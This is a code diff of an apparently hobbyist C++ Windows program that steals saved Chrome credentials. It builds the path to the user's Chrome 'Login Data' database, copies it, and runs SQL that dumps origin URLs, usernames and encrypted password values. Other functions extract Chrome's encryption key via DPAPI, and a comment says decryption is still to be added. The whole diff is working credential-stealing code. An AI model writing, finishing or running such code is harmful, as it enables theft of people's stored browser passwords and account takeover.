@@ -110,9 +110,6 @@ BYTE * GetEncryptionKey(){
         putchar(temp_key[i]);
     }
     printf("\nITS DPAPI\n");
-    for (int j = 0;j < temp_key.size() - 5; j++){
-        putchar(Key[j]);
-    }
     //omg it actually works:((( im going to cry
     PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
     blob->cbData = temp_key.size()- 5;
@@ -129,7 +126,17 @@ BYTE * GetEncryptionKey(){
 
 BYTE * decrypt_password();
 //need aem functionality desparately plus file i/o stuff asap
-
+static int callback(void *data, int argc, char **argv, char **azColName){
+   int i;
+   printf("in callback\n");
+   
+   for(i = 0; i<argc; i++){
+      printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
+   }
+   
+   printf("\n");
+   return 0;
+}
 
 
 
@@ -142,14 +149,55 @@ int main(){
         printf("didnt get path\n");
         return -1;
     }
-    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data");
-    printf("%s\n", const_cast<char*>(db_path.c_str()));
+    //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
+    
+    //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
+    std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"));
+    //std::cout << "S: "<< s << '\n';
+    const char * db_path = s.c_str();
+    //size_t wn = mbsrtowcs(NULL, &t, 0, NULL);
+    //wchar_t * buf = new wchar_t[wn + 1]();;
+    //wn = mbsrtowcs(buf, &t, wn + 1, NULL);
+    //LPCWSTR db_path = buf;
+    //free(buf);
+    //printf("%s\n", const_cast<char*>(db_path.c_str()));
     //copy the file contents to a new file
-    std::string temp = "ChromeData.db";
+    //printf("DB_PATH: %S", db_path);
+    
+    //delete[] buf;
+    const char * temp = "ChromeData.db";
     //this is still a bit buggy bc of encoding issus :(
     //CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str())); 
    //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
    //create a db connection
-   BYTE *key = GetEncryptionKey(); //omg
+   //BYTE *key = GetEncryptionKey(); //omg
+
+   if (!CopyFile(db_path,temp, false)){
+    printf("COPY FILE W FAILED \n");
+    printf("Error: %d\n", GetLastError());
+   }
+
+   sqlite3 *db;
+   char *zErrMsg = 0;
+   int rc;
+    //https://www.tutorialspoint.com/sqlite/sqlite_c_cpp.htm
+   rc = sqlite3_open(temp, &db);
+
+   if( rc ) {
+      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+      return(0);
+   } else {
+      fprintf(stderr, "Opened database successfully\n");
+   }
+    const char * sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
+   const char* data = "Callback function called";
+   rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
+   if( rc != SQLITE_OK ) {
+      fprintf(stderr, "SQL error: %s\n", zErrMsg);
+      sqlite3_free(zErrMsg);
+   } else {
+      fprintf(stdout, "Operation done successfully\n");
+   }
+   sqlite3_close(db);
     
 }
